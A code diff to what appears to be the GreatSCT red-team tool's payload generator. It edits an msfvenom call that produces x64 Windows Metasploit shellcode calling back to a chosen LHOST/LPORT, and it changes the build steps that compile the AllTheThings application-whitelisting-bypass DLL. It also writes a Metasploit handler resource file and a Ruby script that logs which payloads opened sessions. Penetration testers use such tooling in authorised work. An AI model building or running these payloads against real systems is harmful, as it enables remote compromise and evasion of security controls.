@@ -54,13 +54,14 @@ class Generator():
             self.genMetasploitReourceFile(host, port, payload)
             self.genAnalystCSVFile(name, uuid)
         else:
-            os.system("msfvenom -a x86 --platform windows -p {0} PayloadUUIDTracking=true PayloadUUIDName={1} LHOST={2} LPORT={3} -f {4}\
+            os.system("msfvenom -a x64 --platform windows -p {0} PayloadUUIDTracking=true PayloadUUIDName={1} LHOST={2} LPORT={3} -f {4}\
              > /tmp/metasploit 2> /dev/null".format(payload.replace("windows/", "windows/x64/"), uuid, host, port, form))
             self.genMetasploitReourceFile(host, port, payload)
             self.genAnalystCSVFile(name, uuid)
         with open("/tmp/metasploit", 'rb') as f:
             code = f.read()
 
+        os.system('rm /tmp/metasploit')
         shellcode = str(code)
 
         if shellProcess == 'hexEncode':
@@ -193,18 +194,17 @@ class Generator():
         build_steps = [
             "apt-get install mono-complete -y >/dev/null 2>&1",
             "git clone https://github.com/ConsciousHacker/AllTheThings >/dev/null 2>&1",
-            "wget -O https://github.com/mono/nuget-binary/raw/master/nuget.exe >/dev/null 2>&1",
-            "cp ./GenerateAll/allthethings.cs ./AllTheThings/AllTheThings/Program.cs >/dev/null 2>&1",
+            "wget https://github.com/mono/nuget-binary/raw/master/nuget.exe -O nuget.exe >/dev/null 2>&1",
+            "cp ./GenerateAll/allthethings_{0}.cs ./AllTheThings/AllTheThings/Program.cs".format(name),
+            "rm ./AllTheThings/AllTheThings/bin/Release/AllTheThings.dll >/dev/null 2>&1",
             "mono --runtime=v4.0 nuget.exe restore ./AllTheThings/AllTheThings.sln >/dev/null 2>&1",
-            "mdtool build ./AllTheThings/AllTheThings/AllTheThings.csproj >/dev/null 2>&1",
-            "cp ./AllTheThings/AllTheThings/bin/Debug/AllTheThings.dll ./GenerateAll/AllTheThings_{0}\
-            .dll >/dev/null 2>&1".format(
-                name),
-            "sleep 10"
+            "mdtool build '--configuration:Release' ./AllTheThings/AllTheThings/AllTheThings.csproj >/dev/null 2>&1",
+            "cp ./AllTheThings/AllTheThings/bin/Release/AllTheThings.dll ./GenerateAll/AllTheThings_{0}.dll >/dev/null 2>&1".format(
+                name)
         ]
 
         for step in build_steps:
-            os.popen(step)
+            os.system(step)
 
     def genMetasploitReourceFile(self, host, port, payload):
         """
@@ -224,7 +224,7 @@ set TimestampOutput true
 set VERBOSE true
 set ExitOnSession false
 set EnableStageEncoding true
-set AutoRunScript ./GenerateAll/payloadtracker.rc
+set AutoRunScript /opt/GreatSCT/GenerateAll/payloadtracker.rc
 set LHOST {0}
 set LPORT {1}
 set payload {2}
@@ -241,17 +241,19 @@ run -j'''.format(host, port, payload)
         It works by checking if the UUID has changed into Metasploit and then
         searches for the entry in anaylst.csv and marks the column TRUE.
         """
-        msfrc = '''<ruby>
-if session.payload_uuid.respond_to?(:puid_hex) && uuid_info = framework.uuid_db[session.payload_uuid.puid_hex]
-    f = open("./GenerateAll/analyst.csv", "r+")
-    f.each_line do |line|
-        if line.include? uuid_info["PayloadUUIDName"].to_s
-            f.puts line.gsub("FALSE", "TRUE")
-        end
-    end
+        msfrc = '''if session.payload_uuid.respond_to?(:puid_hex) && uuid_info = framework.uuid_db[session.payload_uuid.puid_hex]
+
+    f = open("./GenerateAll/analyst.csv", "r")
+    text = f.read
     f.close
-end
-</ruby>'''
+
+    if text.include? name = uuid_info["datastore"]["PayloadUUIDName"].to_s
+        puts "GreatSCT: Marking " + name + " as successful in ./GenerateAll/analysts.csv"
+        new_success = text.gsub(uuid_info["datastore"]["PayloadUUIDName"].to_s + ",FALSE", uuid_info["datastore"]["PayloadUUIDName"].to_s + ",TRUE")
+        open("./GenerateAll/analyst.csv", "w") {|file| file.puts new_success}
+    end
+
+end'''
         with open('./GenerateAll/payloadtracker.rc', 'w+') as f:
             f.write(msfrc)
 
